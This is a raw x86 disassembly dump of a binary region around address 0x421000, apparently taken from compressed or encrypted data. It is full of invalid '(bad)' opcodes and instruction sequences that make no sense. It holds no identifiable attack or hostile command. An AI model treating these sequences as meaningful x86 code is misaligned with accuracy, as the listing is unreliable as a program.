  42103d:	sbb    al,0xc3
  42103f:	xchg   ebx,eax
  421040:	sbb    esp,0xffffffa0
  421043:	lock and ebx,ecx
  421046:	xor    edx,DWORD PTR [edi-0x7a]
  421049:	pop    edx
  42104a:	adc    al,0x26
  42104d:	mov    ds:0x1a4fd79a,eax
  421052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421053:	cmp    al,0xe
  421055:	mov    esi,ebp
  421057:	or     BYTE PTR [edi],0x65
  42105a:	js     0x420fe1
  42105c:	adc    BYTE PTR [esi-0x7c],ah
  42105f:	jmp    0x3e35:0xd09140e2
  421066:	ds mov eax,0xff8758fb
  42106c:	fisubr WORD PTR [esi+0x38d2d6dc]
  421072:	xchg   DWORD PTR [esi-0x10fa9019],esi
  421078:	inc    edi
  421079:	jg     0x4210de
  42107b:	push   cs
  42107c:	cmp    eax,0x27cbf38
  421081:	jl     0x421041
  421083:	outs   dx,BYTE PTR ds:[esi]
  421084:	mov    ah,0xbf
  421086:	jnp    0x421106
  421088:	(bad)  
  42108a:	loope  0x421062
  42108c:	rcl    DWORD PTR [ebx+0x1fed],1
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ?,WORD PTR [edx]
  421101:	clc    
  421102:	push   ebx
  421103:	stc    
  421104:	or     al,0x60
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	mul    esi
  42110e:	jmp    0x42112d
  421110:	into   
  421111:	adc    BYTE PTR [ecx+0xc3dedc7],0x95
  421118:	in     al,0x76
  42111a:	xchg   DWORD PTR [edx],ecx
  42111c:	(bad)  
  42111d:	(bad)  
  42111e:	mov    ds:0x6853485b,al
  421123:	xor    DWORD PTR [ebx],edi
  421125:	es pop es
  421127:	ins    BYTE PTR es:[edi],dx
  421128:	push   ds
  421129:	adc    ebx,DWORD PTR [edx+esi*2-0x19327f66]
  421130:	sub    eax,edi
  421132:	ds dec ecx
  421134:	hlt    
  421135:	sub    BYTE PTR [eax-0x55],0x79
  421139:	sub    cl,ch
  42113b:	adc    ebx,ecx
  42113d:	ret    
  42113e:	mov    eax,ds:0xd1e4477
  421143:	push   ds
  421144:	cmp    bh,ah
  421146:	arpl   WORD PTR [eax+0x78423457],bx
  42114c:	pop    ecx
  42114d:	mov    ah,0xda
  42114f:	xchg   DWORD PTR [edi+0xf],eax
  421152:	xor    esi,esp
  421154:	fdiv   st(7),st
  421156:	jle    0x42112b
  421158:	popf   
  421159:	shl    BYTE PTR fs:[ebx+esi*4-0x6],0x59
  42115f:	xchg   ebx,eax
  421160:	mov    esi,0xcb45bc27
  421165:	test   eax,0x83aad015
  42116a:	daa    
  42116b:	loope  0x42116f
  42116d:	jle    0x4211bb
  42116f:	or     esp,DWORD PTR [ecx-0x61b56445]
  421175:	int    0x57
  421177:	xor    ebp,DWORD PTR [ebx+ebx*1]
  42117a:	fldenv [ebx]
  42117c:	or     eax,0x1eb631f3
  421181:	mov    esi,0x86fb6163
  421186:	mov    edi,0x1db14df1
  42118b:	cli    
  42118c:	cdq    
  42118d:	int    0x56
  42118f:	shl    BYTE PTR [ecx+ebp*8-0x7aad729d],1
  421196:	in     eax,0x2e
  421198:	jo     0x421202
  42119a:	push   0xffffffb7
  42119c:	sub    bl,BYTE PTR [ebp*4-0x5c79df47]
  4211a3:	sub    eax,0x3af2f6ea
  4211a8:	js     0x421211
  4211aa:	xlat   BYTE PTR ds:[ebx]
  4211ab:	arpl   WORD PTR [esi],ax
  4211ad:	pop    ebx
  4211ae:	pop    eax
  4211af:	xor    DWORD PTR cs:[esi-0x69],ebx
  4211b3:	(bad)  
  4211b4:	xchg   esi,eax
  4211b5:	fwait
  4211b6:	ret    
  4211b7:	xchg   edi,eax
  4211b8:	add    BYTE PTR [eax],bl
  4211ba:	dec    edi
  4211bb:	mov    ds,WORD PTR [ecx+0x6d7c4c5]
  4211c1:	sub    BYTE PTR [esi+0x6b],ah
  4211c4:	and    BYTE PTR [edx+ecx*1],0x3d
  4211c8:	call   0x700f03b8
  4211cd:	jl     0x42117c
  4211cf:	sbb    dh,dl
  4211d1:	mov    ebx,0xbfa976b2
  4211d6:	fwait
  4211d7:	mov    ds:0xb5b431ac,al
  4211dc:	repnz sbb edx,ebp
  4211df:	loopne 0x4211d2
  4211e1:	jg     0x4211bf
  4211e3:	adc    esi,ebx
  4211e5:	xchg   di,ax
  4211e7:	popa   
  4211e8:	jo     0x4211e3
  4211ea:	add    ch,0x39
  4211ed:	inc    edi
  4211ee:	xchg   BYTE PTR [ecx],dh
  4211f0:	mov    ebx,DWORD PTR [edi+0x13032211]
  4211f6:	in     al,dx
  4211f7:	sub    al,bl
  4211f9:	inc    edi
  4211fa:	sub    DWORD PTR [edi+0x44660a8d],edi
  421200:	and    esp,DWORD PTR [ebp-0x68f8bf6f]
  421206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421207:	fcmovu st,st(1)
  421209:	fadd   QWORD PTR [ecx+ecx*4]
  42120c:	cmp    edx,edx
  42120e:	nop
  42120f:	outs   dx,BYTE PTR ds:[esi]
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x8c7ab32d
  421281:	pushf  
  421282:	das    
  421283:	add    DWORD PTR [eax],edx
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    al,0x1
  42128a:	add    BYTE PTR [eax],al
  42128c:	outs   dx,BYTE PTR ds:[esi]
  42128d:	(bad)  
  42128e:	cld    
  42128f:	jno    0x42127e
  421291:	lahf   
  421292:	cld    
  421293:	and    ch,BYTE PTR [edi+ebx*4+0x27]
  421297:	sub    al,0x5c
  421299:	xchg   esp,eax
  42129a:	sub    bh,BYTE PTR [eax+esi*4]
  42129d:	adc    eax,0x27894b5
  4212a2:	inc    eax
  4212a3:	xor    bl,BYTE PTR [ebx]
  4212a5:	mov    edx,DWORD PTR ds:0x99f37aba
  4212ab:	pop    es
  4212ac:	sub    ecx,DWORD PTR [edi+0x72c4081e]
  4212b2:	xchg   DWORD PTR [edx-0x4e],esp
  4212b5:	daa    
  4212b6:	jns    0x4212ab
  4212b8:	mov    esi,0xc8a217e
  4212bd:	je     0x4212b6
  4212bf:	xchg   edi,eax
  4212c0:	jge    0x4212cd
  4212c2:	lahf   
  4212c3:	and    eax,0x2606d26d
  4212c8:	mov    ch,0xba
  4212ca:	ss popa 
  4212cc:	inc    eax
  4212cd:	stos   BYTE PTR es:[edi],al
  4212ce:	out    0xe3,al
  4212d0:	rcl    DWORD PTR [edi+0x386f2f5e],1
  4212d6:	jle    0x42130c
  4212d8:	dec    edx
  4212d9:	bnd ret 
  4212db:	test   eax,0xf15c0fc2
  4212e0:	fcom   DWORD PTR [edi+0x6f]
  4212e3:	scas   eax,DWORD PTR es:[edi]
  4212e4:	(bad)  
  4212e6:	rcr    BYTE PTR [eax+0x779cf9d1],cl
  4212ec:	xor    ch,BYTE PTR [edx+0x2ece586e]
  4212f2:	loope  0x4212ee
  4212f4:	sbb    cl,bh
  4212f6:	adc    cl,BYTE PTR [edx-0x55]
  4212f9:	enter  0x4d08,0x26
  4212fd:	bnd jbe 0x42136d
  421300:	(bad)  
  421301:	xchg   ebx,eax
  421302:	hlt    
  421303:	enter  0x67a5,0xa6
  421307:	js     0x421383
  421309:	dec    edx
  42130a:	adc    DWORD PTR [eax],eax
  42130c:	leave  
  42130d:	mov    dl,0x85
  42130f:	add    al,0xf4
  421311:	xchg   DWORD PTR [eax],eax
  421313:	stos   BYTE PTR es:[edi],al
  421314:	jno    0x421392
  421316:	and    DWORD PTR [ecx-0x49],0x1b
  42131a:	mov    ecx,0x77a52575
  42131f:	rol    BYTE PTR [eax-0xca90ec8],0xea
  421326:	jg     0x421389
  421328:	mov    esp,0xac468460
  42132d:	add    bl,al
  42132f:	cli    
  421330:	mov    ss,WORD PTR [edx-0x13]
  421333:	shr    DWORD PTR [ebp+0x4],0xb
  421337:	enter  0xc981,0xce
  42133b:	imul   ecx,DWORD PTR ds:0x8f350dc3,0xa986261f
  421345:	jne    0x421388
  421347:	out    0xa1,eax
  421349:	sub    DWORD PTR [edi+0x5d613954],ebp
  42134f:	sti    
  421350:	jnp    0x421340
  421352:	xor    BYTE PTR ds:0xe82047d9,bl
  421358:	xlat   BYTE PTR ds:[ebx]
  421359:	out    0x53,al
  42135b:	jge    0x4213a2
  42135d:	(bad)  
  42135e:	repz dec esi
  421360:	push   0xa76fb7f9
  421365:	pop    ss
  421366:	frstor [esi]
  421368:	cmp    al,0x6
  42136a:	dec    ecx
  42136b:	imul   ebp
  42136d:	cmc    
  42136e:	cmp    edi,DWORD PTR [esi*2-0x29ee5464]
  421375:	push   edx
  421376:	dec    ebp
  421377:	mov    edx,0xec034483
  42137c:	lea    esi,[eax-0x62a4f2dd]
  421382:	stos   DWORD PTR es:[edi],eax
  421383:	sub    ch,dh
  421385:	lar    ebp,WORD PTR [esi]
  421388:	pop    ecx
  421389:	push   0x32
  42138b:	data16 or dl,BYTE PTR [esi-0x78]
  42138f:	mov    ah,0x0
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x2a170b61]
  421402:	push   ebx
  421403:	dec    ebp
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	int    0x22
  42140e:	in     al,0x4b
  421410:	aad    0x8
  421412:	and    eax,0xd985ec53
  421417:	pop    ebp
  421418:	pop    esi
  421419:	sbb    bl,BYTE PTR [esi-0x73099f6b]
  42141f:	gs pop esi
  421421:	loope  0x4213f3
  421423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421424:	adc    bl,BYTE PTR [edi-0x6df52d02]
  42142a:	push   esp
  42142b:	push   eax
  42142c:	cld    
  42142d:	pop    ss
  42142e:	dec    ebp
  42142f:	xchg   edx,esi
  421431:	jp     0x421420
  421433:	dec    esi
  421434:	or     eax,0x59105ef0
  421439:	mov    ds:0xd60e478,eax
  42143e:	pop    ecx
  42143f:	mov    ds:0x66fb903a,eax
  421444:	push   edi
  421445:	mov    bl,0x9f
  421447:	jne    0x42147e
  421449:	jbe    0x42148d
  42144b:	sahf   
  42144c:	mov    esp,0x2616237c
  421451:	sub    ch,ch
  421453:	sbb    al,0x3f
  421455:	mov    esp,0x383c942c
  42145a:	lahf   
  42145b:	pop    edx
  42145c:	stc    
  42145d:	hlt    
  42145e:	xchg   ebx,eax
  42145f:	test   al,0xa2
  421461:	popa   
  421462:	sbb    ch,0x88
  421465:	loope  0x42149d
  421467:	inc    ebx
  421468:	or     BYTE PTR es:[esp+eiz*8-0x312be2a0],bl
  421470:	inc    esi
  421471:	int    0x6a
  421473:	fisttp WORD PTR [edx+ebx*8+0x7292497a]
  42147a:	bnd repz jbe 0x42147f
  42147e:	push   cs
  42147f:	pop    edx
  421481:	add    ch,ah
  421483:	cmc    
  421484:	inc    esi
  421485:	xchg   edi,eax
  421486:	std    
  421487:	jmp    0x66d6e716
  42148c:	sub    al,0xa2
  42148e:	push   0x2d
  421490:	inc    edi
  421491:	jecxz  0x4214b5
  421493:	mov    ?,WORD PTR [edx]
  421495:	sbb    ch,BYTE PTR [ecx-0x33ebea6c]
  42149b:	push   edi
  42149c:	add    ebx,edi
  42149e:	push   eax
  42149f:	push   ecx
  4214a0:	cdq    
  4214a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214a2:	push   ds
  4214a3:	dec    ebx
  4214a4:	sub    BYTE PTR [edx+0x21],0x80
  4214a8:	outs   dx,BYTE PTR ds:[esi]
  4214a9:	mov    dl,0xa7
  4214ab:	aam    0x21
  4214ad:	mov    cl,0xfd
  4214af:	in     al,0xc8
  4214b1:	pop    ecx
  4214b2:	mov    ds:0x6d3a4cef,al
  4214b7:	aaa    
  4214b8:	jl     0x42147a
  4214ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214bb:	cdq    
  4214bc:	or     bl,BYTE PTR [edx]
  4214be:	or     al,0x3c
  4214c0:	add    al,0x1
  4214c2:	ins    BYTE PTR es:[edi],dx
  4214c3:	cdq    
  4214c4:	das    
  4214c5:	aad    0xaa
  4214c7:	sbb    al,0x3d
  4214c9:	(bad)  
  4214ca:	xchg   esi,eax
  4214cb:	aaa    
  4214cc:	sub    eax,0x96b03f0d
  4214d1:	call   0x690a1b3d
  4214d6:	pop    es
  4214d7:	mov    ds:0x48c45329,eax
  4214dc:	adc    al,BYTE PTR [eax]
  4214de:	cs push 0xbabd41
  4214e4:	or     DWORD PTR [edx],ebx
  4214e6:	jle    0x421556
  4214e8:	dec    esi
  4214e9:	lods   eax,DWORD PTR ds:[esi]
  4214ea:	fimul  DWORD PTR [eax+0x3f]
  4214ed:	push   0x9c0f1a0e
  4214f2:	cli    
  4214f3:	mov    ch,0x8c
  4214f5:	adc    ebp,DWORD PTR [esi]
  4214f7:	push   esp
  4214f8:	stos   DWORD PTR es:[edi],eax
  4214f9:	out    0x27,al
  4214fb:	dec    eax
  4214fc:	mov    cs,WORD PTR [eax]
  4214fe:	jns    0x4214fd
  421500:	push   ebx
  421501:	mov    eax,ds:0x98f8dfc6
  421506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421507:	add    cl,BYTE PTR [bx+si-0x7c]
  42150b:	jg     0x4214bd
  42150d:	push   esp
  42150e:	cli    
  42150f:	loop   0x421511
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x52aabd4c],bp
  421582:	iret   
  421583:	or     eax,0x16318
  421588:	add    al,0x1
  42158a:	add    BYTE PTR [eax],al
  42158c:	pushf  
  42158d:	add    esp,DWORD PTR fs:[edi+0x5b77e7d7]
  421594:	fld    TBYTE PTR [edx+0x29]
  421597:	sahf   
  421598:	into   
  421599:	jg     0x421598
  42159b:	push   ecx
  42159c:	test   DWORD PTR [edi+edi*4],0x5424f3ec
  4215a3:	shr    DWORD PTR [ecx],1
  4215a5:	pop    ds
  4215a6:	js     0x42157f
  4215a8:	scas   al,BYTE PTR es:[edi]
  4215a9:	cld    
  4215aa:	aam    0xf5
  4215ac:	inc    DWORD PTR [eax]
  4215ae:	push   esp
  4215af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215b0:	ret    
  4215b1:	shr    BYTE PTR [edi-0x45],1
  4215b4:	arpl   WORD PTR [ecx],di
  4215b6:	mov    DWORD PTR [eax+0x2a],0x2cbf1fbf
  4215bd:	adc    DWORD PTR [ebx-0x5b3a9235],edx
  4215c3:	nop    DWORD PTR [esi*4+0x8b7d4d8]
  4215cb:	call   0xb8592b9c
  4215d0:	ja     0x42156f
  4215d2:	cmp    cl,ch
  4215d4:	mov    ds:0x8232ab97,al
  4215d9:	sbb    DWORD PTR [ecx-0x35dc8f98],ecx
  4215df:	fwait
  4215e0:	cmp    eax,0x3519218b
  4215e5:	or     ch,BYTE PTR [ebp-0x40]
  4215e8:	cmp    DWORD PTR [ebx+edi*8],0xfffffff7
  4215ec:	push   esi
  4215ed:	scas   al,BYTE PTR es:[edi]
  4215ee:	add    eax,0x64224e0
  4215f3:	mov    dl,0x60
  4215f5:	ins    BYTE PTR es:[edi],dx
  4215f6:	std    
  4215f7:	shr    DWORD PTR [edi-0x23],0x90
  4215fb:	dec    edx
  4215fc:	aad    0xb9
  4215fe:	out    0xa8,al
  421600:	les    esi,FWORD PTR [esi+0x6c586677]
  421606:	out    dx,eax
  421607:	fimul  DWORD PTR [eax-0x6c925029]
  42160d:	mov    dh,0x36
  42160f:	xchg   esi,esi
  421611:	mov    dl,0xc6
  421613:	sub    eax,0x7a2a126b
  421618:	test   edx,ebp
  42161a:	pop    ss
  42161b:	add    esp,DWORD PTR [eax+0x10]
  42161e:	leave  
  42161f:	in     eax,0xf3
  421621:	jno    0x42167d
  421623:	(bad)  
  421624:	aaa    
  421625:	sub    BYTE PTR [esi],cl
  421627:	pop    es
  421628:	mov    esp,0xeb7d4ad9
  42162d:	inc    esp
  42162e:	rol    bh,0x66
  421631:	mov    bh,0x56
  421633:	iret   
  421634:	repz push ss
  421636:	add    DWORD PTR [edi-0x6d],edi
  421639:	test   al,0xb8
  42163b:	fs loop 0x42166d
  42163e:	jmp    0x4216b3
  421640:	test   BYTE PTR [ebx+0x40],dh
  421643:	ins    BYTE PTR es:[edi],dx
  421644:	mov    esp,0x3eb58be5
  421649:	sbb    bl,BYTE PTR [edi+0x3835320b]
  42164f:	mov    esp,0xc07dea55
  421654:	add    ch,BYTE PTR [ecx-0xa67e9a]
  42165a:	pop    edi
  42165b:	mov    WORD PTR [edx+ebp*2+0x3960ce85],ss
  421662:	mov    eax,ds:0x36e411b1
  421667:	mov    eax,0xf1d719a3
  42166c:	sub    BYTE PTR [ecx-0x37],bl
  42166f:	mov    cs,WORD PTR [ebx-0x6a1bb38b]
  421675:	cwde   
  421676:	add    ebp,DWORD PTR [ebp-0x41e3cebd]
  42167c:	popa   
  42167d:	les    eax,FWORD PTR [esi]
  42167f:	aaa    
  421680:	jne    0x42161b
  421682:	adc    ecx,DWORD PTR [eax+0x5064a21f]
  421688:	bound  edx,QWORD PTR [eax+0x7029959e]
  42168e:	retf   
  42168f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	cld    
  421701:	cmc    
  421702:	sbb    DWORD PTR [edi+0x1c],eax
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	aaa    
  42170d:	lahf   
  42170e:	rcr    WORD PTR [edi+0xc2ab3c9],1
  421715:	pop    esi
  421716:	aas    
  421717:	shr    DWORD PTR [ebx],0xa9
  42171a:	mov    eax,ds:0xd26f6abc
  421720:	cmp    BYTE PTR [eax],dh
  421722:	add    BYTE PTR [edi+0x2312dc6],dl
  421728:	in     al,0x95
  42172a:	jge    0x4216b0
  42172c:	jb     0x4216e7
  42172e:	das    
  42172f:	and    al,0x9
  421731:	mov    al,0x86
  421733:	ret    0x6325
  421736:	dec    esi
  421737:	sbb    DWORD PTR [ecx],0x75
  42173a:	rcr    DWORD PTR [esi],0x92
  42173d:	jne    0x421757
  42173f:	xchg   ebx,eax
  421740:	sbb    bl,BYTE PTR [edx]
  421742:	push   ss
  421743:	arpl   WORD PTR [edi],si
  421745:	jl     0x4216ef
  421747:	(bad)  
  421749:	sub    DWORD PTR [ecx+0x1418c317],edx
  42174f:	ret    
  421750:	jmp    DWORD PTR [ebp-0xf]
  421753:	and    al,0x4
  421755:	outs   dx,DWORD PTR ds:[esi]
  421756:	scas   al,BYTE PTR es:[edi]
  421757:	jmp    0x4a4d:0x6f529672
  42175e:	in     eax,dx
  42175f:	inc    esp
  421760:	and    DWORD PTR [eax+ebx*8],edi
  421763:	adc    eax,0x394e01c7
  421768:	sahf   
  421769:	leave  
  42176a:	in     eax,dx
  42176b:	es mov esi,0x540d30bb
  421771:	xor    DWORD PTR ds:[edi],0x694f65de
  421778:	jge    0x4217a8
  42177a:	jp     0x4216fc
  42177c:	sbb    eax,0xc84c7dbb
  421781:	mov    al,dl
  421783:	stc    
  421784:	mul    DWORD PTR [ebx+0x55]
  421787:	or     eax,0xd16519e4
  42178c:	inc    eax
  42178d:	hlt    
  42178e:	iret   
  42178f:	and    eax,0xf39c1da8
  421794:	test   DWORD PTR [eax-0x7a],esi
  421797:	retf   0x775f
  42179a:	notrack jmp ax
  42179e:	test   al,0xc
  4217a0:	fs push esp
  4217a2:	mov    eax,0x82013dea
  4217a7:	dec    ebx
  4217a8:	xchg   edi,eax
  4217a9:	ins    BYTE PTR es:[edi],dx
  4217aa:	arpl   WORD PTR [eax],di
  4217ac:	and    ah,cl
  4217ae:	outs   dx,BYTE PTR ds:[esi]
  4217af:	add    DWORD PTR ss:0x9f293825,ebp
  4217b6:	pop    esi
  4217b7:	mov    ecx,0xf06975f9
  4217bc:	out    dx,eax
  4217bd:	inc    esp
  4217be:	imul   eax,DWORD PTR [ecx+0x4d],0x7d
  4217c2:	jae    0x4217fe
  4217c4:	rcl    DWORD PTR [ecx+0x26],1
  4217c7:	push   esi
  4217c8:	jae    0x42179e
  4217ca:	scas   al,BYTE PTR es:[edi]
  4217cb:	dec    esp
  4217cc:	xor    DWORD PTR [esi-0x49e6bb94],esi
  4217d2:	out    dx,al
  4217d3:	jle    0x421842
  4217d5:	add    BYTE PTR [edi-0x6eee6268],al
  4217db:	dec    edx
  4217dc:	mov    dl,0x1a
  4217de:	bound  esp,QWORD PTR [esi]
  4217e0:	je     0x42184b
  4217e2:	sub    BYTE PTR [ebp+0x67],dh
  4217e5:	stc    
  4217e6:	repnz loop 0x4217e2
  4217e9:	push   edx
  4217ea:	out    dx,eax
  4217eb:	shl    DWORD PTR [eax-0x6b],1
  4217ee:	pop    esi
  4217ef:	(bad)  
  4217f0:	cli    
  4217f1:	inc    esi
  4217f2:	mov    esp,0x6b7c3497
  4217f7:	xor    ah,BYTE PTR [edx+0x6c60ca5d]
  4217fd:	xor    bh,BYTE PTR [eax+0x228def93]
  421803:	mov    edx,0xa85a0d5a
  421808:	enter  0xc71,0xb4
  42180c:	mov    ds:0xcd1447,al
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	loopne 0x421849
  421882:	repnz xor BYTE PTR [eax],ah
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	(bad)  
  42188e:	xchg   BYTE PTR [ecx+ebx*1+0x3e43cd39],ch
  421895:	cs push esi
  421897:	loope  0x4218cd
  421899:	(bad)  
  42189b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42189c:	int    0x57
  42189e:	jmp    0x5f47:0xc9d3a0c3
  4218a5:	xor    esi,esp
  4218a7:	dec    ebx
  4218a8:	loopne 0x4218c6
  4218aa:	inc    edx
  4218ab:	fstp   QWORD PTR [ebp+0x53]
  4218ae:	cli    
  4218af:	or     dl,BYTE PTR [eax-0x55747a40]
  4218b5:	loop   0x4218a9
  4218b7:	repnz int3 
  4218b9:	dec    ebx
  4218ba:	mov    esp,0x5f6bcbcd
  4218bf:	out    dx,al
  4218c0:	xor    ah,BYTE PTR [eax]
  4218c2:	mov    bl,0x4e
  4218c4:	das    
  4218c5:	adc    edx,DWORD PTR [esi]
  4218c7:	pop    es
  4218c8:	jmp    0x4218b6
  4218ca:	inc    edi
  4218cb:	mov    al,0x96
  4218cd:	scas   eax,DWORD PTR es:[edi]
  4218ce:	mov    esi,0xb8aa71d
  4218d3:	pusha  
  4218d4:	pop    ecx
  4218d5:	mov    cl,0x77
  4218d7:	dec    esi
  4218d8:	push   eax
  4218d9:	adc    DWORD PTR [ebp+0x502ca4c3],edx
  4218df:	jle    0x42190d
  4218e1:	sahf   
  4218e2:	js     0x4218bc
  4218e4:	cmp    ebx,DWORD PTR [ebx-0x6]
  4218e7:	repnz dec edi
  4218e9:	popf   
  4218ea:	loop   0x42189c
  4218ec:	push   cs
  4218ed:	icebp  
  4218ee:	retf   0xc6fb
  4218f1:	push   edi
  4218f2:	into   
  4218f3:	jmp    0x42187e
  4218f5:	pushf  
  4218f6:	data16 adc al,0x73
  4218f9:	gs popa 
  4218fb:	or     ebx,ebx
  4218fd:	push   0xb9a46d80
  421902:	xchg   BYTE PTR [esi+eiz*4-0x7f],ch
  421906:	inc    edi
  421907:	cmp    esi,ebx
  421909:	cdq    
  42190a:	(bad)  
  42190b:	loopne 0x421968
  42190d:	fnstenv [ebx+0x597d5389]
  421913:	inc    ebp
  421914:	xor    al,0xb6
  421916:	pop    ds
  421917:	inc    ebp
  421918:	inc    esi
  421919:	lods   eax,DWORD PTR ds:[esi]
  42191a:	cmp    DWORD PTR [esi],0xffffffd4
  42191d:	enter  0xd7b6,0xe7
  421921:	mov    bl,0x1b
  421923:	bound  edi,QWORD PTR [ecx]
  421925:	ss int3 
  421927:	dec    ecx
  421928:	cmp    al,0xb4
  42192a:	aad    0x3a
  42192c:	lods   eax,DWORD PTR ds:[esi]
  42192d:	les    edx,FWORD PTR [esi-0x68]
  421930:	add    eax,0x35b03b55
  421935:	jo     0x42193b
  421937:	jl     0x4218e5
  421939:	in     eax,0x58
  42193b:	mov    ds,WORD PTR [edx+eax*2-0x6edc8a2]
  421942:	xchg   ebx,eax
  421943:	fsub   st,st(6)
  421945:	push   ebx
  421946:	ins    BYTE PTR es:[edi],dx
  421947:	mov    esi,DWORD PTR [edx-0x3aacaa9]
  42194d:	aaa    
  42194e:	sti    
  42194f:	push   ss
  421950:	or     al,BYTE PTR [edx+0x3724f734]
  421956:	jg     0x4218f2
  421958:	or     DWORD PTR [ebp-0x28],edx
  42195b:	ja     0x421986
  42195d:	xor    bh,bh
  42195f:	je     0x4219cd
  421961:	in     eax,dx
  421962:	sbb    eax,0x81f3b241
  421967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421968:	out    dx,al
  421969:	and    ebp,DWORD PTR [esi-0x67]
  42196c:	mov    dh,0xf0
  42196e:	(bad)  
  42196f:	pop    ss
  421970:	bound  ebp,QWORD PTR [ecx+0x6d]
  421973:	sti    
  421974:	inc    ebp
  421975:	sub    BYTE PTR [eax-0x78],0x23
  421979:	test   al,0xc3
  42197b:	pop    edx
  42197c:	jle    0x421948
  42197e:	push   ss
  42197f:	lods   al,BYTE PTR ds:[esi]
  421980:	test   al,0xdc
  421982:	sbb    DWORD PTR [ecx],ebx
  421984:	pop    edi
  421985:	popf   
  421986:	fisub  WORD PTR [ebx-0xb832895]
  42198c:	scas   eax,DWORD PTR es:[edi]
  42198d:	jo     0x421964
  42198f:	xchg   edx,eax
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	mov    ds:0x245ae9f5,al
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	sahf   
  421a0d:	mov    ebx,0x16b2c247
  421a12:	jo     0x421a4a
  421a14:	je     0x421a92
  421a16:	out    dx,eax
  421a17:	adc    al,0x75
  421a19:	jb     0x421a6b
  421a1b:	xor    al,bh
  421a1d:	call   0x69f4de06
  421a22:	dec    esi
  421a23:	sub    BYTE PTR ds:0xd56ec14a,ah
  421a29:	retf   
  421a2a:	shr    BYTE PTR [eax-0x515c517d],cl
  421a30:	jb     0x4219fd
  421a32:	loope  0x421a4f
  421a34:	int3   
  421a35:	xor    eax,0xebc090df
  421a3a:	pop    esi
  421a3b:	push   edi
  421a3c:	js     0x421aab
  421a3e:	add    dh,cl
  421a40:	pop    ebp
  421a41:	daa    
  421a42:	scas   eax,DWORD PTR es:[edi]
  421a43:	into   
  421a44:	mov    edi,0x19904a99
  421a49:	sbb    edi,DWORD PTR [ebx+0x12]
  421a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a4d:	dec    ebx
  421a4e:	sar    DWORD PTR [ecx+0x4351e096],cl
  421a54:	daa    
  421a55:	push   0xfe0b33f3
  421a5a:	dec    DWORD PTR [esi+0x3a3dc01d]
  421a60:	pop    ss
  421a61:	(bad)  
  421a62:	imul   ecx,DWORD PTR [eax-0x79],0x15
  421a66:	xor    esi,DWORD PTR [edi]
  421a68:	scas   al,BYTE PTR es:[edi]
  421a69:	arpl   WORD PTR [ecx-0xcebcb8a],bp
  421a6f:	fwait
  421a70:	clc    
  421a71:	sub    ch,BYTE PTR ds:0x2e29cc9a
  421a77:	(bad)  
  421a78:	ins    DWORD PTR es:[edi],dx
  421a79:	loopne 0x421a0a
  421a7b:	pop    es
  421a7c:	(bad)  
  421a7d:	cmp    eax,DWORD PTR [esi+0x1d]
  421a80:	jno    0x421a2e
  421a82:	inc    eax
  421a83:	aas    
  421a84:	sar    dl,1
  421a86:	scas   al,BYTE PTR es:[edi]
  421a87:	in     eax,dx
  421a88:	jne    0x421a1f
  421a8a:	test   al,0x91
  421a8c:	lods   eax,DWORD PTR ds:[esi]
  421a8d:	mov    cl,0x70
  421a8f:	scas   eax,DWORD PTR es:[edi]
  421a90:	out    dx,al
  421a91:	cdq    
  421a92:	std    
  421a93:	add    bl,BYTE PTR [ebp+0x374ddf9a]
  421a99:	mov    ds:0x2b1dd3e2,al
  421a9e:	jae    0x421a77
  421aa0:	clc    
  421aa1:	jp     0x421aaf
  421aa3:	xchg   ebp,eax
  421aa4:	dec    ebp
  421aa5:	dec    esp
  421aa6:	xchg   ebx,eax
  421aa7:	out    dx,al
  421aa8:	ja     0x421af0
